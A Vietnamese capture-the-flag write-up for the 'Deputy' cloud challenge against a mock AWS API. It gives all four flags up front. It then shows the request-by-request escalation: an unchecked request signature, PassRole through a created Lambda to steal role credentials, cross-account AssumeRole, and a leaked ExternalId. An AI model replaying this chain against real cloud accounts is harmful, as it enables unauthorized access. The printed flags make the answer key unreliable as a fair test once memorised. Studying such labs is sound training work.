# Deputy - Cloud (Hard)

Sứ mệnh này gồm 4 cờ (flag) ẩn giấu theo cấp độ thâm nhập (objective):

```text
recon       H7CTF{d6cc592f5a2f3db80718}
passrole    H7CTF{28f87391f8a228110839}
admin       H7CTF{ea3e1dba8012d76e2648}
externalid  H7CTF{1dbe909840d15aabdd63}
```

**Dịch vụ (Instance):** `https://web-d8f0b09a99a6a969.web.h7tex.com` 
**Thông tin xác thực (Credentials) ban đầu:** `AKIAANALYST0000000000` (định danh người dùng `analyst`, trên mã tài khoản hệ thống `111111111111`).

## Đề bài

Hệ thống được thiết lập trong bối cảnh tích hợp hạ tầng mạng với đối tác DeputyCorp. Người chơi được cấp quyền truy cập qua tài khoản `analyst` với quyền hạn rất hạn chế. Mục tiêu là kiểm tra quá trình tích hợp, tìm ra các lỗ hổng về cấu hình và thu thập 4 cờ bảo mật của hệ thống.

## Phân tích ban đầu

Môi trường kiểm thử là một mô hình giả lập (mock) AWS được xây dựng trên nền tảng `Werkzeug/3.1.8`. Thông qua việc gọi API, có thể xác định 3 bề mặt API chính của mô hình:

| Bề mặt API | Cấu trúc yêu cầu (Request) |
| --- | --- |
| Dịch vụ phân quyền STS + IAM | Phương thức `POST /` với dữ liệu payload chứa `Action=...&Version=...` (hệ thống xử lý dựa trên `Action`). |
| Dịch vụ lưu trữ S3 | Yêu cầu `GET /<bucket>` và `GET /<bucket>/<key>` (Sử dụng chuẩn path-style; hệ thống đọc tên bucket từ đường dẫn, nếu lỗi trả về `NoSuchBucket: <tên_bucket>`). |
| Hàm Serverless (Lambda) | REST API tiêu chuẩn: `GET|POST /2015-03-31/functions`, `POST /2015-03-31/functions/<name>/invocations`. |

Điểm yếu cấu hình quan trọng nhất của hệ thống mô phỏng là việc bỏ qua kiểm tra chữ ký (signature validation). Để vượt qua hệ thống, chỉ cần khai báo header `Authorization: AWS4-HMAC-SHA256 Credential=AKIA.../us-east-1/iam/aws4_request, Signature=x`. Máy chủ đọc mã khóa truy cập (access key id) từ header, kết hợp token phiên làm việc (session token) qua `X-Amz-Security-Token`, và gán chính sách phân quyền nội tuyến (inline policy) tương ứng. Do hệ thống không cung cấp sẵn thư viện `boto3`, người chơi cần tạo kịch bản xử lý client tùy chỉnh (script `analysis/awsclient.py`).

Việc phân tích các tài liệu chính sách (policy document) là cốt lõi để xác định giải pháp cho bài toán. Hai lệnh `ListPolicies`/`GetPolicyVersion` chỉ trả về mảng dữ liệu rỗng do mô hình giới hạn ở các chính sách nội tuyến (inline policy):

```text
iam:ListUserPolicies(analyst)     -> Trả về mảng ["analyst-permissions"]
iam:GetUserPolicy                 -> Trả về tài liệu policy chi tiết
iam:ListRolePolicies(ci-runner)   -> Trả về mảng ["ci-runner-permissions"]
```

Nội dung của hai tài liệu chính sách phản ánh các giới hạn và đặc quyền cấu hình của hệ thống (chi tiết tại tệp `de.md`): Tài khoản `analyst` sở hữu quyền hạn `iam:PassRole` hướng đến vai trò `ci-runner-role`, đồng thời có quyền tạo và kích hoạt Lambda function (`lambda:CreateFunction|InvokeFunction`). Trong khi đó, `ci-runner-role` được cấu hình đặc quyền `sts:AssumeRole` cho phép chuyển vai trò sang `arn:aws:iam::999999999999:role/partner-admin-role`. Lớp bảo vệ của runner (trust policy) bị bỏ qua, cho phép các dịch vụ `lambda.amazonaws.com` tự do giả mạo chức năng.

## Quá trình khai thác

### Giai đoạn 1 - Trinh sát (recon)

Lệnh `s3:ListAllMyBuckets` (`GET /`) cho thấy 4 kho lưu trữ (bucket): `deputy-analyst-scratch`, `deputy-runner-logs`, `deputy-flag-vault`, và `deputy-crown-vault`. Tài khoản `analyst` chỉ có quyền truy cập bucket đầu tiên:

```text
GET /deputy-analyst-scratch        -> Phơi bày tập tin <Key>welcome.txt</Key>
GET /deputy-analyst-scratch/welcome.txt
  Welcome, analyst.
  H7CTF{d6cc592f5a2f3db80718}
  Onboarding: our deploys run through a Lambda that executes as ci-runner-role.
```
Cờ số 1 được chứa trong tập tin chào mừng, đính kèm thông tin gợi ý về luồng phân quyền thông qua `ci-runner-role`.

### Giai đoạn 2 - Cấp quyền (PassRole) vào Lambda 

Tài khoản Analyst không có đặc quyền gọi trực tiếp `sts:AssumeRole` để giả mạo runner (do chính sách trust policy chỉ áp dụng cho dịch vụ Lambda), nhưng sở hữu quyền `iam:PassRole` với định danh ARN cụ thể đó. Phương án triển khai: Tạo một hàm (Function) mới, gán vai trò đó, sau đó tiến hành kích hoạt:

```http
POST /2015-03-31/functions
  {"FunctionName":"deputy-relay","Role":"arn:aws:iam::111111111111:role/ci-runner-role",
   "Runtime":"python3.11","Handler":"lambda_function.lambda_handler","Code":{"ZipFile":"..."}}
-> Kết quả: 201 Created

POST /2015-03-31/functions/deputy-relay/invocations
-> Kết quả: 200 {"message":"function executed; the execution role's environment credentials follow",
        "AWS_ACCESS_KEY_ID":"ASIA...","AWS_SECRET_ACCESS_KEY":"...","AWS_SESSION_TOKEN":"..."}
```

Kiểm tra quyền (`GetCallerIdentity`) của thông tin xác thực mới nhận được, kết quả trả về là `arn:aws:sts::111111111111:assumed-role/ci-runner-role/awslambda-deputy-relay`. Lợi dụng vỏ bọc này để truy cập dữ liệu:

```text
GET /deputy-runner-logs/build.log -> H7CTF{28f87391f8a228110839}
```

### Giai đoạn 3 - Gán quyền chuyển đổi (AssumeRole) sang Partner

Theo cấu trúc policy, vai trò runner được cấp phép thực hiện `AssumeRole`, và đối tượng mục tiêu `partner-admin-role` không cấu hình bảo mật giới hạn bổ sung:

```text
Action=AssumeRole RoleArn=arn:aws:iam::999999999999:role/partner-admin-role
  RoleSessionName=deputy-step (Yêu cầu tên phiên phải >= 2 ký tự; nếu không hệ thống sẽ trả về ValidationError).
-> Nhận được: ASIA... / tok/...  (Chuyển quyền tài khoản sang 999999999999)
```

Sử dụng đặc quyền Admin để truy cập tài nguyên kho lưu trữ `deputy-flag-vault`:

```text
GET /deputy-flag-vault        -> Hiển thị 2 vật phẩm: flag, partner-config.json
s3://deputy-flag-vault/flag                 -> Thu nhận cờ: H7CTF{ea3e1dba8012d76e2648}
s3://deputy-flag-vault/partner-config.json  -> Thu nhận dữ liệu cấu hình: {"secure_role":"arn:aws:iam::999999999999:role/partner-secure-role",
                                                 "external_id":"Dc-2026-8f31a97c4b2e"}
```

### Giai đoạn 4 - Tấn công theo kỹ thuật Confused-Deputy

Kho lưu trữ cuối cùng `deputy-crown-vault` trả về mã lỗi 403 đối với cả phiên partner-admin. Việc nâng cấp lên vai trò `partner-secure-role` đã được kiểm soát nghiêm ngặt (hardened): trust policy bắt buộc phải đính kèm tham số xác thực `sts:ExternalId`. Hệ thống AWS giả lập phản hồi các lỗi cấu hình như sau:

```text
AssumeRole partner-secure-role                          -> Trả về 403: The trust policy requires an sts:ExternalId but none was provided.
AssumeRole ... ExternalId=wrong_parameter       -> Trả về 403: The trust policy requires a matching sts:ExternalId.
AssumeRole ... ExternalId=Dc-2026-8f31a97c4b2e          -> Thành công 200: assumed-role/partner-secure-role/crown-step
```

Sử dụng chuỗi xác thực mới để yêu cầu: `GET /deputy-crown-vault/flag` -> Trả về cờ cuối: `H7CTF{1dbe909840d15aabdd63}`.

### Cấu trúc luồng leo thang đặc quyền (Privilege Escalation Graph)

```text
Tài khoản khởi tạo (user/analyst)
  ├─ s3:GetObject(scratch)                -> Cờ số 1 (recon)
  ├─ iam:PassRole(ci-runner) với lambda:CreateFunction/Invoke
  │     -> Chuyển đổi thành ci-runner-role  -> Cờ số 2 (passrole)
  │        -> Cấu hình sts:AssumeRole qua partner-admin-role (acct 999999999999)
  │                                        -> Cờ số 3 (admin)
  │           -> Thông qua s3:GetObject(flag-vault) trích xuất external_id
  │              -> Thực thi sts:AssumeRole đội lốt partner-secure-role (kết hợp ExternalId=...)
  │                                        -> Cờ số 4 (externalid)
```

## Kết Quả
```bash
$ python solve_deputy.py
[+] STAGE 1 recon: H7CTF{d6cc592f5a2f3db80718}
[+] STAGE 2 passrole: H7CTF{28f87391f8a228110839}
[+] STAGE 3 admin: H7CTF{ea3e1dba8012d76e2648}
[+] STAGE 4 externalid: H7CTF{1dbe909840d15aabdd63}
```

Kiểm tra hệ thống: Chạy công cụ `python solve_deputy.py` (cần tệp đi kèm `analysis/awsclient.py`; ghi nhật ký cờ thu thập ra `flags.txt`). Khi thực thi nhiều lần trên cùng một instance, bước CreateFunction có thể trả về lỗi `409 Conflict` nếu hàm Lambda đã tồn tại, nhưng lệnh invoke vẫn được tiếp tục thực thi, duy trì khả năng truy cập tài nguyên ở các lần chạy sau.
